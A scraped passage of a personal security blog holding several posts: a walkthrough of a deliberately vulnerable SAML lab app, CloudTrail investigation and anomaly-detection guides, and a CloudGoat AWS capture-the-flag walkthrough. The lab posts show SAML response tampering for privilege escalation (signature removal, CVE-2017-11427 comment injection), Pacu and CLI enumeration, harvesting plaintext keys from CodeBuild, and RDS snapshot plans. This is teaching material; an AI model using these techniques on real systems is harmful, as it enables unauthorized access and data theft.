a SP). We need to change some configuration details.\nFirst clone the repository onto both hosts:\ngit clone https://github.com/yogisec/VulnerableSAMLApp.git cd VulnerableSAMLApp On the host that will become the IDP run the configure_platform.py script. Work through the prompts filling in the information as requested to make the necessary edits to the IDP configuration files.\npython3 configure_platform.py If you had the script build the docker container for you run the container with the following command and then skip down to configure the SP:\nsudo docker run -it --rm --name idp -d -p 80:80 idp:1.0 If you did not let the script build the container we need to build it. We can do that with the following command:\ncd vulnerableidp sudo docker build -t idp:1.0 . This will build a container with the name idp and the tag 1.0. Next run the container with:\nsudo docker run -it --rm --name idp -d -p 80:80 idp:1.0 Confirm the container is running by running:\nsudo docker ps If its running we should see an output similar to:\n189adee1b091 localhost/idp:1.0 apache2ctl -D FOR... 2 seconds ago Up 2 seconds ago 0.0.0.0:80-\u0026gt;80/tcp idp We can confirm the IDP is listening by running curl:\ncurl http://127.0.0.1 Next on the Service Provider host run the configure_platform.py script. Work through the prompts filling in the information as requested to make the necessary edits to the application configuration files.\npython3 configure_platform.py If you had the script build the docker container for you run the container with the following command and then skip down to the Features section to learn about the application:\nsudo docker run -it --rm --name sp -d -p 80:80 sp:1.0 If you did not let the script build the container we need to build it. We can do that with the following command:\ncd vulnerablesp sudo docker build -t sp:1.0 . This will build a container with the name sp and the tag 1.0. The next step is to run the container. This can be done with:\nsudo docker run -it --rm --name sp -d -p 8000:8000 sp:1.0 We can confirm the container is running by issuing:\nsudo docker ps This should produce an ouput similar to this:\n94476aee1abf sp:1.1 \u0026#34;uwsgi --ini vulnsp.…\u0026#34; 4 minutes ago Up 4 minutes 0.0.0.0:8000-\u0026gt;8000/tcp sp We can confirm the application is up and listening by curling the interface with:\ncurl http://127.0.0.1:8000 At this point the IDP and the SP should be up and running and accessible. The next section will provide an overview of some of the features of the application.\nFeatures of the environment Login credentials:\nUsername Password Description yogi bear Basic user account, memeber of the \u0026lsquo;users\u0026rsquo; group. No special permissions admin this-is-the-administrator-pasword-oh-no-is-that-a-typo-in-password Regular administrator account, member of the admin group. This account has the ability to delete the complaints. brubble password This is account was registered specifically for CVE-2017-11427 instructor G0od-LuckGu3ssingThisButHeyItCouldHappenRight? This account is allowed to reset the complain board back to its original state. Additionally this account was the ability to increase or decrease the security posture of the application. After successfully logging in we are presented with our profile as seen by the application. This is a quick and easy way to confirm which user we are, as well as our current group membership.\nThe complaints tab is where all of the complaints are stored and is the overall goal of the application.\nIn the screenshot below we have authenticated with the admin user account and have a new capability to delete complaints.\nThe instructor account has several special features to help maintain order within the application. There is a \u0026lsquo;Restore Complaints\u0026rsquo; button on the complaints page that reverts all of the complaints back to the starting state of the application.\nThe instructor account also has a new tab called Saml Settings. Within this tab we can make the application more or less security by checking the features we want to have turned on or off.\nThe Scenarios Setting Description Nothing Configured The application accepts any SAML message, edit away, the application trusts everything. Valid Assertion / Valid Messages The Service Provider is checking for valid assertions, any tampering results in the message being rejected. Unless we remove the signature block. Want Assertions / Messages Signed The Service Provider requires the messages to be signed, but it doesn\u0026rsquo;t check to see if they are valid signatures. Everything Signed, Everything Valid This is the ideal deployment, messages must be signed and they must be valid, no tampering allowed. CVE-2017-11427 This is an implementation of CVE-2017-11427 which leverages comments within the SAML response XML to bypass security controls. Note: for all of the SAML message tampering below I am leveraging the SAML Raider plugin for burp. It handles the decoding of the messages on the fly and allows for edits. It also supports XSW attacks which are currently beyond the scope of this application.\nAdditional Note: When changing from one scenario to the next it is best to make sure you signed out before adjusting the security levels of the Service Provider (SP). This helps to ensure there are no unforseen outcomes.\nNothing Configured For this scenario we\u0026rsquo;ll use the security configuration pictured below.\nBefore we get to far into this scenario, I wanted to take a moment and say that this scenario, this configuration issue, is the MOST common implementation flaw that I come across.\nOnce we authenticate to our IDP we can make any changes to the SAML response that we want. The message will not be checked, the SP will simply process it as valid. The screenshot below shows the original assertion before tamper:\nnothing_orig_assertion\nNow, if we change our user group to the administrators group as pictured below we will successfully escalate our privileges from a regular user account to a full admin within the SP.\nnothing_tamper_assertion\nOnce we pass the SAML response payload along to the SP we are now an administrator within the SP and as we can see below when we click on the complaints tab we now have the ability to delete all of the complaints.\nnothing_delete\nWe can even take it a step further if we\u0026rsquo;d like and replace all of the fields within the response with fake information similar to the picture below. As the SP logs our \u0026lsquo;malicious\u0026rsquo; doings it will log all of our fake information. The only true way to determine who we were before changing our use settings would be to sync up the logs from the IDP and the SP to determine who authenticated to the IDP before the malicious activity began.\nnothing_fake\nAbove I mentioned that this configuration is the most common issue that I find when testing SAML implementations. The reason for this is because when most applications are initially configured to leverage saml the check box to make sure messages are secure is left unchecked. This allows the owners to validate that all of the backend configuration that occurs between the SP and the IDP is correctly configured without dealing with certificates. The unfortunate part is most of the time this is where things get left. The messages are left fully vulnerable to anyone who can authenticate to the IDP.\nValid Assertion / Valid Message / Both For this scenario we\u0026rsquo;ll use the security configuration pictured below. This scenario plays out the exact same way if validMessage is also checked, or if it is checked and validAssertion is not.\nvalid_assertion_config\nOn the surface this seems like the ideal configuration. The Service Provider is checking for valid assertions, any tampering with the assertion attributes results in the message being rejected. In the picture below we have authenticated as the Yogi user account, and our assertion payload includes attributes about our account including our group membership \u0026lsquo;users\u0026rsquo;.\nvalid_assertion_group\nWe can attempt change the group membership to another group such as the \u0026lsquo;administrators\u0026rsquo; group in the photo below.\nvalid_assertion_group_edited\nUnfortunatly as we can see below the message is rejected because its not valid when compared to the signature for the message.\nvalid_assertion\nThere is a big security flaw with this configuration. The SP is only checking that the assertion is valid IF its signed. The application does not have signed messages as a requirement. If we remove the entire signature block from our SAML payload the message can be changed.\nIn the Burp intercept for the web traffic within the SAML raider tab we can click the \u0026lsquo;Remove Signatures\u0026rsquo; button to remove the entire signature area of the XML SAML Response.\nsigned_signature_removed\nWhen we attempt to tamper with the SAML response without a signature the SP accepts our resposne and we are now authenticated to the application as a member of the administrators group!\nsigned_success\nWant Assertions / Messages Signed Things are slightly improving with this deployment. With this configuration the Assertion and/or Message must be signed. Since the application requires a signature we cannot just remove the signature block like we did in the previous scenario. To prove all of this out we will use the configuration below:\nsigned_config\nThe first thing we can try is to simply remove the signature elements. We wont tamper with anything, just a quick test to see if we can remove the signatures and have the SAML response still be accepted by the SP.\nsigned_signature_removed\nAs expected with our current configuration settings the SP rejects the response payload because it is invalid.\nsigned_error\nPerhaps we can leave the signature elements in the response message but change the assertion attributes? Below we can see the memberOf attribute value has been changed from the users group to the administrators group.\nsigned_group_change\nSending the response payload along and we are greated with a successful login as well as our new permissions as a member of the administrators group!\nsigned_success\nWhy did that work? The application is checking for signatures isn\u0026rsquo;t it? Well it is and it isn\u0026rsquo;t. The application in its current configuration is checking to make sure there are signature attributes within the SAML response and that it is signed with the trusted certificate. It\u0026rsquo;s not actually checking if they are valid or not. If the signature elements are in the message the application assumes its legitimate and trust worthy.\nSigned and Valid In this scenario we\u0026rsquo;ll use the following configuration:\nsigned_valid_config\nThis configuration is what is expected when deploying an application leveraging SAMl authentication. In this setup the SP requires that the messages are signed and that the signatures match the data in the overall message and the assertion. This means as an attacker we cannot tamper with the areas of the message which are used to calculate the signatures. This includes the attribute values within the assertion. Let\u0026rsquo;s try out a couple things and see the outcomes.\nThere is a known bug with this deployment where when the application requires signed messages it will error on an attempt to sign out after a valid log in. The current work around is to either delete the session cookies, or to lower the security settings of the application by removing the requirement for signed messages to complete the log out. In the case of this application leaving the application with a requirement for the Assertions to be signed produces the same effect as also requirin the messages to be signed.\nLets try to remove the signature of the SAML response:\nsigned_signature_removed\nThis results in the error below, because the application is checking to see if the message is signed.\nsigned_valid_errors\nLets leave the signature but change the attribute values within the assertion.\nsigned_group_change\nThis results in another error. This is because the application is configured to make sure the messages are valid if they are signed.\nsigned_valid_errors\nThe next scenario is able to bypass this situation and it does so in a very intersting way.\nCVE-2017-11427 In February of 2018 DUO labs release details about vulnerabilities in 6 libraries that application leverage to use for SAML. This includes the library used as the source for this application. The original article is here.\nAt a high level, you can add a comment in the middle of the XML assertion to change the attributes/values of the SAML response. The really damaging part of this is that depending on the library being used the comment may be ignored during the signature calculation of the message. So to the SP the message is still valid. For this application we\u0026rsquo;ll need to lower our security settings in order to become vulnerable to this attack. The configuration is below:\ncve_config\nFor this scenario we\u0026rsquo;ll pivot away from the \u0026lsquo;Yogi\u0026rsquo; user account and use the Barney Rubble (brubble) user account. Imagine that Barney is an employee who has \u0026lsquo;power user\u0026rsquo; permissions within the Service Provider. He doesn\u0026rsquo;t have full admin rights so deleting comments isn\u0026rsquo;t avaialble to him. One of the things that he is allowed to do is create groups! He created a group called \u0026lsquo;administratorsbutnot\u0026rsquo; and added his user account to the group. Lets see how the scenario plays out.\nFirst we\u0026rsquo;ll log in and confirm the group membership is correct, and that as Barney we do not have the ability to delete comments.\nLogin success and correct group membership:\ncve_group\nOn complaints page we do not have access to delete:\ncve_complaints\nNow we will sign out and back in again, this time changing the SAML response to comment out the \u0026lsquo;butnot\u0026rsquo; portion of the group membership like this: administrators\u0026lt;!--butnot--\u0026gt;\ncve_comment\nSuccess! We\u0026rsquo;ve logged into the application and it looks like we are now a memeber of the administrators group.\ncve_group_admins\nChecking the complaints page we now have the ability to delete comments!\ncve_delete\nOther attacks There are several more types of vulnerabilities that could exist. Message replays, where an attacker sends a message after its TTL has expired.\nXSW attacks which take chunks of the SAML response and duplicate it and place it in various places within the response. In these scenarios the SP checks to see if a valid signed assertion/message/etc. exists and then processes the message. What if there are two assertions, the first valid, and signed but the second is not. Which will the application process? The first, second, last, cause it to crash?\nThe Yogi Vulnerable SP is not yet vulnerable to these attacks, but they\u0026rsquo;re on the list.\nReferences Great References:\nRFC7522 SAML Overview of SAML Authentication vs Authorization Bypassing SAML 2.0 SSO with XML Signature Attracks Duo Finds SAML Vulnerabilities Affecting Multiple Implementations ","permalink":"https://jellyparks.com/posts/vulnerable-saml-app/","summary":"Overview of a vulnerable saml platform built to allow for various saml exploits to occur.","title":"Yogi's Vulnerable SAML app"},{"content":" Cloudtrail events in AWS offer a lot of visibility into the calls that roles leverage within the platform. Sometimes tracking the original source of the activity can be challenging. When users and other aws services from one account assume role into another hunting the origin can take a bit of backtracking.\nThe Scenario Let\u0026rsquo;s set up a scenario, and work backwards through the logs. For this scenario we\u0026rsquo;ll pretend that we are alerted to an anomalous api call. This anomaly is a call to the STS get-caller-identity endpoint. The principal ID AROA5B64I5MBKOV6DYPCR has never made a call to this endpoint. The full raw event is below. Next we\u0026rsquo;ll begin to disscet it.\nDigging into this, there are several fields that as an analyst are important to us while we try to unravel the intent behind this call. Lets break them down a bit:\nField Value Event Description type AssumedRole The type of the identity. AssumedRole = temporary credentials made with a role assumption. Learn More principalId AROA5B64I5MBKOV6DYPCR:power-lambda-session This is a unique identifer for the session. eventSource sts.amazonaws.com This is the service in AWS that was leveraged. eventName GetCallerIdentity This is the action that was called. sourceIPAddress 3.208.93.89 Where the action call came from userName power-users-lambda The role being leveraged. This field changes purpose, and location depending on the value of the type field. Learn More Now that we have some basic information about what occured we can continue our analysis. At this point we have a basic understanding of the API call that was made. We know where the calls came from (sploier its an amazon ip) and we also know the role that made the call. At this point I would pivot off of the principalId to see what other calls were made. Our initial alert fired because the GetCallerIdentity call had never been made before. What if other calls were made that had previously been made from this same principal, but this time they were made with a malicious intent?\nLuckily for us, after further analysis we find that no additional calls were made. We\u0026rsquo;re still missing pieces to this puzzle however, who made this call and where in AWS did it actually come from?\nWho Made the Call? To understand where and who made this call we need to find the inital authentication event tied to this session. We can do that by searching for the eventSource: sts.amazonaws.com and eventName: AssumeRole event in the CloudTrail logs. Its likely that there are going to be several of these events. These occur anytime something leverages a role within the account.\nWe need to somehow correlate an event (GetCallerIdentity) to an assume role action. To do that there are several fields that can help. In the picture below I\u0026rsquo;ve called them out with arrows.\nOne of the best ways to narrow and better correlate events is with time. Its not foolproof, but it can be a good starting point. The best correlation points are going to be the accessKeyId and the assumeRoleID. Also make note, if you\u0026rsquo;re searching these logs in splunk, kibana, etc. the first event for this principal ID depending on how you\u0026rsquo;ve filtered will likely be this event.\nOnce we have the AssumeRole event the information we are looking for which answers the \u0026lsquo;where?\u0026rsquo; and \u0026lsquo;who?\u0026rsquo; exists within the userIdentity value. In the picture above we can see that the userIdentity has three values:\nField Value Event Description type AWSAccount The request came from another AWS account. Learn More principalId AROA6OTNF75AHUEQU2DWT:sts-tester This is the principalId of the role in the foreign aws account that made the request. accountId 1212121212121 This is the account where the assume role request origninated from Now we know: what was done, who did it, and where the request originated. The next step is start analyzing the Cloudtrail events the 12121212121212 account. We will determine if the activity we were first alerted on was a result of malicious activity occuring or someone trying something new.\nInitial AssumeRole Request To confirm what we think we know from our previous event, lets look for the initiating assume role event. This will allow us to confirm that the event originated in account 12121212121212 and confirm the resource that made the request. We can find this initial event by searching for a few key vaules.\nThe principalId that we discovered within the userIdentity key in the previous event: AROA6OTNF75AHUEQU2DWT:sts-tester The assumeRole eventname: AssumeRole The accesKeyId in the responseElement: ASIA5X73I5MBJI37NG6J The event that we discover (pictured above) provides us with several pieces of context and confirmation. We now know without a doubt that the request came from this account and that we have the correct principal. We can use this information to find the resource within the account and do futher investigation.\nHow can we tell what the resource is? For these cloudtrail logs its fairly evident through the names that this is tied to a Lambda. But what if the name did not give it away so easily? Do we rummage through every possible endpoint that could make this call?\nLooking at the userAgent field is one way we can determine what the resource is. Bare in mind that this is not 100% and the user agent could be changed or perhaps it does not give the resource away quite like the event we\u0026rsquo;re looking at.\nAnother way is to look at the role that is being leveraged by the principal. In our event the role being leveraged by the lambda can be seen by looking sessionIssuer values. The friendly name of the role being leveraged can be found within the userName field:\nAll of the information within sessionIssur can be helpful, in our case the friendly name of power-users-lambda is enough for us. We can now pivot to the IAM roles section of aws within the 12121212121212 account and search for our power-users-lambda role. The results of that search are below:\nThe important field here, is the trusted entities column. In this case it shows AWS service: lambda. This tells us that this role can only be used by Lambda scripts. We can quickly bounce over to the lambda section and find our resource. The name of the lambda is sts-tester which we discovered earlier in our principalId within the userIdentity key.\nWith the Lambda discovered we can analyze the code, find the resource owner and ask them if the behavior is expected. If it is not we have additional digging to do to gain insight into how the lambda became compromised. Fortunatly for us, the developer who owned this lambda was merely attempting to understand how to leverage a lambda cross account.\nReference Docs:\nhttps://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference-user-identity.html https://docs.aws.amazon.com/IAM/latest/UserGuide/cloudtrail-integration.html https://aws.amazon.com/blogs/security/how-to-audit-cross-account-roles-using-aws-cloudtrail-and-amazon-cloudwatch-events/ ","permalink":"https://jellyparks.com/posts/assumed-role-breadcrumbs/","summary":"Cloudtrail events in AWS offer a lot of visibility into the calls that roles leverage within the platform. Sometimes tracking the original source of the activity can be challenging. When users and other aws services from one account assume role into another hunting the origin can take a bit of backtracking.","title":"assumed_role_breadcrumbs"},{"content":" This is going to be an ongoing post for awhile. It was inspired by Netflix\u0026rsquo;s skunkworks group who gave a talk at re:invent 2019 in regards to building a cloudtrail anomaly detection platform leveraging Amazon services. I highly recommend watching the talk.\nI liked the idea, but not the deployment method netflix showcased. It didn\u0026rsquo;t scale to the size I needed it to (Looking at the final product in production now it probably would have, but I didn\u0026rsquo;t want to run and maintain an EC2 instance). Additionally there were also some aspects that I reworked to lessen the load (and cost) of Athena queries. We\u0026rsquo;ll talk more about these differences and more further in the post. This post will walk through this code.\nData Flow Below is how the data and api calls are made within aws. The code in the middle is several Lambda scripts but for the data flow it made sense to consolodate them into a single entity.\nAn high level explaination for each of the steps in the diagram is below:\nQuery main orgaization account for a list of all accounts within the organization Configure Athena tables, start query execution Athena queries the CloudTrail S3 bucket(s) for all activity per account for the past hour Athena sends results to S3 results bucket Athena returns \u0026lsquo;Success\u0026rsquo; message with along with the results object Scripts grabs the results and parses them by unique role, event source, and event name Each unique record is checked against DynamoDB table. If its new alert (if it meets criteria). Send alerts to Splunk Inspiration The original design is a script that runs off an Ec2 instance with the required role to access the CloudTrail events, Athena, S3, and DynamoDB. The original repo is here and I forked it here.\nStructural Differences While porting the original concept over from what Netflix released. I decided that I didn\u0026rsquo;t want to have to deal with the run and maintain of an EC2 instance. While its not a huge deal, it was just something that I didn\u0026rsquo;t want to do. This is where we have our first major structural difference between the original source, and what was rolled into production. The deployment in my github repo is serverless. Kicked off by cron jobs running every hour.\nBelow is a expanded data flow showing the Lambda scripts, and what occurs at each stage.\nMain Lambda function (Muster) kicks off based on CloudWatch cron configuration. It queries for account numbers in the organization, builds a date object, and for each account it sends the account, date object, and miscellaneous variables into an SNS message to trigger the discernment Lambdas. SNS message triggers discernment Lambdas. One account per Lambda execution. The discernment lambda checks for an Athena table for the account, if it doesn\u0026rsquo;t exist it makes it, it also builds the table partition if it does not exist. Queries the CloudTrail logs in from an S3 bucket for ALL account activity for the past hour. The function gathers the results, parses them per ROLE, and checks the activity vs the DynamoDB table. If new behavior is detected, and it meets \u0026lsquo;alert\u0026rsquo; criteria, an alert event is pushed to Splunk. The next major difference is the Athena queries. The original code provides the ability to create a table if it does not exist. However, depending on how the data is structured within the S3 buckets, it may need to have paritions manually defined so that Athena can quickly search for the results it needs. Once the partitions have been defined, they must constantly be updated and maintained for each new day. Both of these were challenges that I had to address.\nAnother shift in the Athena queries is around the query to pull activity for the past hour. Initially I leveraged the original query:\nSELECT DISTINCT eventsource, eventname FROM cloudtrail_123456789 WHERE useridentity.type = \u0026#39;AssumedRole\u0026#39; AND useridentity.sessioncontext.sessionissuer.principalid= \u0026#39;PRINCIPAL_ID\u0026#39; AND eventTime \u0026gt; to_iso8601(current_timestamp - interval \u0026#39;1\u0026#39; hour); As the capabaility began to scale out I began to run into API rate limits between the Athena queries and S3. I also noticed that despite the fact that the query calls out a specific principal to search for the amount of data scanned by Athena was the same. I decided to shift the principal parsing to the Lambda function and changed the Athena query to pull back all of the account activity for the past hour. This introduced no noticiable overhead to the Lambda function but DRAMATICALLY reduced the number of Athena queries that were requred to produce the same results.\nSELECT DISTINCT eventsource, eventname, useridentity.sessioncontext.sessionissuer.principalid, useridentity.type FROM \u0026#34;{business}_ct_anomaly_{account}\u0026#34; WHERE year=\u0026#39;{year}\u0026#39; AND month=\u0026#39;{month}\u0026#39; AND day=\u0026#39;{day}\u0026#39; AND eventTime \u0026gt; to_iso8601(current_timestamp - interval \u0026#39;1\u0026#39; hour); Another slight change in the query above was to pull back all useridentity types. This allows for some future growth. Instead of just looking at AssumedRole activity, the results now also contain all of the 5 useridentity types. In the future we plan to look at Root account activity, as well as local iam user account activity.\nIssues to Watch For There are a few issues to watch out for. The biggest is to make sure that you are not hitting any rate limits with the Athena queries. AWS is pretty transparent about the rate limits for new query submitions, but the other key limit to look out for is the S3 rate limit. This can cause the queries to die.\nDepening on the Dynamo deployment you may run into some limits when reading and writing. This is another key place to keep an eye out and adjust the deployment as needed.\nThe final place where issues may arise (I\u0026rsquo;m sure there are others) is with the Lambdas themself. Make sure the run time is long enough to comlete the work. Both Lambdas will run fairly quickly, but you\u0026rsquo;ll want to make sure you tune them so that they are sized appropriatly.\nTuning Most of the tuning for incident severity is going to occur within the identity_types.py file. This file is structured with a class for each identity type to analyze. As of writing this the only identity type that is \u0026ldquo;complete\u0026rdquo; is the AssumedRole type. The script has the structure built for Root and IAMUser, but they have not been the main focus to get this moved from concept to production.\nThe basic flow of the Assume_Role class is to loop through each role within an AWS account. For each of the roles, loop through all of the cloudtrail events. If the action and the role match, query dynamodb to see if the pairing for the principal, event source, and event action exists within the database. If it does, update the TTL in dynamo. If it does not the script adds it to a list, and then enters into an \u0026ldquo;alert condition\u0026rdquo;. The script has several differet stages to determine if it shoudl alert or not as well as what severity to apply to the alert based on various conditions.\nWhat are the conditions to skip the alert? That is widly going to depend on your own environment. Here are some things that you may end up wanting to add, or adjust to fit your deployment.\nEntire roles to ignore Specific actions to ignore If the role is younger than X days (script is currently set to 15) If its an aws service If the number of new actions is less than X (script sets less than 5 to an information severity) The above list covers what gets ignored, but what about severities? What should the SOC/IR teams spend time on? Once again this is going to entirely depend upon your own environments, the businesses risk tollerances, and other mitigating controls, etc. Within the identity_types.py file there are some sample ratings based on a few different scenarios\u0026hellip;.\n","permalink":"https://jellyparks.com/posts/cloudtrail-anomaly-detection/","summary":"Overview of an anomaly detection platform using cloudtrail logs, athena, lambda, s3, and dynamodb","title":"cloudtrail_anomaly_detection"},{"content":" According to the official documentation for this scenario (here) the overall goal is \u0026ldquo;a pair of secret strings that are stored in a secure RDS database.\u0026rdquo;\nOnce the scenario creation process completes we are presented with a set of access keys for the user account \u0026lsquo;solo\u0026rsquo;.\nWho are we? First lets make sure the credentials we have obtained are valid. We can do this with the following command:\naws --profile solo sts get-caller-identity we get the following successful response:\nWhat can we do? Instead of heading to Pacu and using its handy enumeration lets do something that is a bit lighter on the logs and just poke around a bit. Perhaps we have access to make s3 calls, lets run s3 ls and see what happens.\nInteresting, it does seem like we can see a bucket in s3. Perhaps we can dig deeper and this bucket has something useful in it. After all, judging by its name it probably has some sort of logs and probably other things and stuff in it. We can do this by running:\naws --profile solo s3 ls logaboutlogsthingsandstuff34343434 Unfortunatly it looks like it errors out with a permission denied error. Lets continue on our path of manual enumeration. This time we will branch over into ec2\u0026rsquo;s. Why ec2\u0026rsquo;s, and why did we try s3 first? No real reason, other than to hit services that are fairly common, and that a vast majority of identities have access to.\nTo enumerate the ec2\u0026rsquo;s we will use the describe call:\naws --profile solo ec2 describe-instances |jq \u0026#39;.Reservations[].Instances[] | {InstanceId,PublicDnsName,PublicIpAddress,SubnetId,SecurityGroups,IamInstanceProfile}\u0026#39; This produces the output below, showing us an active ec2 with a public ip address.\nInteresting, lets see if we can dig a bit deeper into the security group that is attached with the name: cg-ec2-ssh-cgidg25jfhzv9a. Chances are that it only allows ssh since its in the name, but who knows a lazy admin could have added other ports to the security group for quick access. We can get the security group details with:\naws --profile solo ec2 describe-security-groups --group-ids sg-09f30e4f217cd294a --region us-east-1 | jq \u0026#39;.SecurityGroups[] | .IpPermissions[]\u0026#39; As expected, the only port allowed with this security gorup is TCP/22.\nAdditional Service Enumeration We now know we cannot see anything useful in S3 and there is not much to do with the Ec2. We could pivot and attempt to log into the SSH. That however, is beyond the scope of this assessment. The great thing about AWS is there are several other services we can enumerate. These keys we have were created for a reason. Up to this point we really have not discovered that reason. MORE enumeration!\nFor this next part we will switch over to Pacu and let it handle some of the additional enumeration for us. There are several services that are not included in Pacu that these keys could be used for, but sometimes its nice to let tools live up to there purpose. Looking at the picture below we can see Pacu has several options within the ENUM category:\nSome of these we have lightly touched. Perhaps we have rights to Lambda? Lets see what happens if we try the lambda__enum.\nrun lambda__enum --region us-east-1 *Note: In the command above I specify the us-east-1 region, this is because I know us-east-1 is only region in my account where workloads are being placed. If you do not know where the workloads exist, you will have to enumerate each region.\nOnce again, brick wall. We are missing the required permissions. All of the other service enumerations return the same results except for one, codebuild.\nCodebuild Enum run codebuild__enum Success! The codebuild enumeration found 1 project and 2 environment variables. Neat! In Pacu we can run the data command to see the information it pulled from our enumeration efforts. Below is a snippet of the data:\nPacu (code_build:solo) \u0026gt; data CodeBuild: { \u0026#34;EnvironmentVariables\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;calrissian-aws-access-key\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;AKIA5X73KRQWNCPL\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;PLAINTEXT\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;calrissian-aws-secret-key\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;nG3Wtl86vXcDp90JUx9smFriCoFk0\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;PLAINTEXT\u0026#34; } ], \u0026#34;Projects\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;cg-codebuild-cgidg25jfhzv9a\u0026#34;, \u0026#34;arn\u0026#34;: \u0026#34;arn:aws:codebuild:us-east-1:1111111111111:project/cg-codebuild-cgidg25jfhzv9a\u0026#34;, \u0026#34;source\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;NO_SOURCE\u0026#34;, \u0026#34;buildspec\u0026#34;: \u0026#34;version: 0.2\\n\\nphases:\\n pre_build:\\n commands:\\n - echo \\\u0026#34;This is CloudGoat\u0026#39;s simpliest buildspec file ever (maybe)\\\u0026#34;\u0026#34; }, \u0026#34;artifacts\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;NO_ARTIFACTS\u0026#34; }, \u0026#34;cache\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;NO_CACHE\u0026#34; }, \u0026#34;environment\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;LINUX_CONTAINER\u0026#34;, \u0026#34;image\u0026#34;: \u0026#34;aws/codebuild/standard:1.0\u0026#34;, \u0026#34;computeType\u0026#34;: \u0026#34;BUILD_GENERAL1_SMALL\u0026#34;, \u0026#34;environmentVariables\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;calrissian-aws-access-key\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;AKIA5X73KRQWNCPL\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;PLAINTEXT\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;calrissian-aws-secret-key\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;nG3Wtl86vXcDp90JUx9smFriCoFk0\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;PLAINTEXT\u0026#34; } ] }, Looking at the output we have a container image, and in the build it sets a couple of environment variables:\n{ \u0026#34;name\u0026#34;: \u0026#34;calrissian-aws-access-key\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;AKIA5X73KRQWNCPL\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;PLAINTEXT\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;calrissian-aws-secret-key\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;nG3Wtl86vXcDp90JUx9smFriCoFk0\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;PLAINTEXT\u0026#34; } Awesome, we have another set of keys. These keys seem to be for a user name Calrissian. It seems like this organization has a fondness for Star Trek.\nCodebuild Manual Enumeration Before we dig into the Calrissian user, lets take a step back and re run this codebuild enumeration using the aws cli. We start buy querying aws for a list of every project.\naws --profile solo codebuild list-projects This produces the name of the project cg-codebuild-cgidg25jfhzv9a\nNow that we have the project name we can query aws for the details about the project with:\naws --profile solo codebuild batch-get-projects --names cg-codebuild-cgidg25jfhzv9a This dumps all of the details about the project. Cleaning the request up a little bit with jq:\naws --profile solo codebuild batch-get-projects --names cg-codebuild-cgidg25jfhzv9a |jq \u0026#39;.projects[].environment.environmentVariables[]\u0026#39; We get the clean output below.\nCalrissian It\u0026rsquo;s time to find out what permissions we have as the Calrissian user. First we will make sure the credentials work by running get-caller-identity.\naws --profile cal sts get-caller-identity We have confirmed the credentials are still valid. Now we need to start the enumeration process over again. We can start just like last time and see if we have access to s3.\naws --profile cal s3 ls Unfortunatly, just like the solo user we do not have access to s3. In fact judging by this error we have even less permission to s3 now than we did with solo. Solo had a policy action to describe-buckets, and we do not.\nAttempting to describe instances returns a similar error that we are unauthorized.\nAfter lots of additional enumeration (and remembering the goal is to access an RDS database) we finally come across an area of aws where we have permissions, RDS. We can determine this and learn details about the environment with the following command:\naws --profile cal rds describe-db-instances |jq \u0026#39;.DBInstances[]\u0026#39; All kinds of useful information is returned as we can see in the screenshot below:\nFrom the details in the screenshot we can determine the type of database, its DNS name, port its listening on, the security group it is a part of, and subnet information.\nInstance Identifer: cg-rds-instance-cgidg25jfhzv9a Engine: postgres Endpoint: cg-rds-instance-cgidg25jfhzv9a.cq9megh2xpgg.us-east-1.rds.amazonaws.com Port: 5432 Security Group: sg-096bb9f39aaa9334d Subnets: subnet-029ccc8e6ee777916, subnet-054c36278fc5a0b5c Lets see if we can connect. We still do not have a password, but if we can connect, we can try and work around that. We know the database is a postgres server so we can use the following command to attempt a connection:\npsql -h cg-rds-instance-cgidg25jfhzv9a.cq9megh2xpgg.us-east-1.rds.amazonaws.com -p 5432 That does not seem to work, it just hangs for a couple of minutes, the psql app is probably trying to connect/reconnect before timing out. Lets confirm that the RDS instance is listening on 5432 and that we have access to it. We can do this with:\nnmap -Pn -p5432 cg-rds-instance-cgidg25jfhzv9a.cq9megh2xpgg.us-east-1.rds.amazonaws.com Looking at the nmap output, it appears that the RDS instance is not configured in a way that we have access to it.\n5432/tcp filtered postgresql At this point we know we have access to make RDS calls. We do not know what our limits are but perhaps we have additional rights. There are a few different paths we could take at this point:\nWe can attempt to take our DB public with modify-db-subnet-group, and then attempt to modify the instance to set a password We can attempt to take a snapshot and then share the snapshot with an account we control We can attempt to snapshot the instance, and create a public version that we control The issue with option 1 is that we have no idea what this might break. It could cause the entire app stack which leverages this DB to crash. As soon as that happens someone will start to dig into why did it crash and inevitably start asking questions about why the DB suddenly changed subnets. Option 2 is a valid and viable option, but in this scenario not necessary. We will move ahead with option 3. Back to enumeration! Lets see if we can gain some insight into the subnets, and security groups.\naws --profile cal rds describe-db-subnet-groups |jq Looking at the output from the command above we see all of the subnets that rds has access to. The two subnets associated with the instance we discovered earlier are a part of a group which has the description: CloudGoat cgidg25jfhzv9a Subnet Group. There does appear to be another subnet group called: cloud-goat-rds-testing-subnet-group-cgidg25jfhzv9a and has a description of CloudGoat cgidg25jfhzv9a Subnet Group ONLY for Testing with Public Subnets. Perhaps we could use this group to grant public access to an instance.\nNext we should see if there is a security group that would allow us to access the RDS instance. We can use the following command:\naws --profile cal ec2 describe-security-groups |jq The output from the command above reveals that the group sg-096bb9f39aaa9334d is a security group that allows access to the postgres port. Screenshot is below.\nOur own DB At this point we know we have a subnet, and a security group that we can apply to an RDS instance that should grant us the access we are looking for. The next thing we should do is see if we have rights to create a 